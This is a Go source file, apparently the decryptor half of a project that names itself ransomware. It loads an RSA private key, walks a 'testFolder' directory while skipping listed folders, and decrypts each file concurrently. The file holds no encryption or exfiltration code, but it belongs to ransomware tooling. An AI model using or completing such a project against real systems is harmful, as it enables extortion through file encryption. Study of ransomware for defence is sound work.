package main

import (
	"crypto/rsa"
	"io/fs"
	"os"
	"path/filepath"
	"ransomware/io"
	"ransomware/utils"
	"sync"
)

var (
	filesToVisit = make(chan io.File)
	waitGroup    sync.WaitGroup
)

func main() {
	privKey, err := io.ReadPrivateKey("cPrivateKey.pem")
	if err != nil {
		panic(err)
	}

	currentDirectory, _ := os.Getwd()
	dir := string(filepath.Dir(currentDirectory) + "/testFolder")

	decryptFiles(dir, privKey)

}

func decryptFiles(dirPath string, cPrivKey *rsa.PrivateKey) {

	waitGroup.Add(1)
	go func() {
		filepath.WalkDir(dirPath, func(path string, d fs.DirEntry, err error) error {

			if d.IsDir() {

				if utils.Contains(utils.FoldersToSkip, filepath.Base(path)) {
					return filepath.SkipDir
				}
			}

			if !d.IsDir() {
				info, err := d.Info()
				if err != nil {
					return err
				}

				filesToVisit <- io.File{Info: info, Path: path, Extension: ""}
			}
			return nil
		})

		defer close(filesToVisit)
		defer waitGroup.Done()
	}()

	waitGroup.Add(1)
	go func() {
		for file := range filesToVisit {
			file.Decrypt(cPrivKey)
		}
		defer waitGroup.Done()
	}()

	waitGroup.Wait()
}
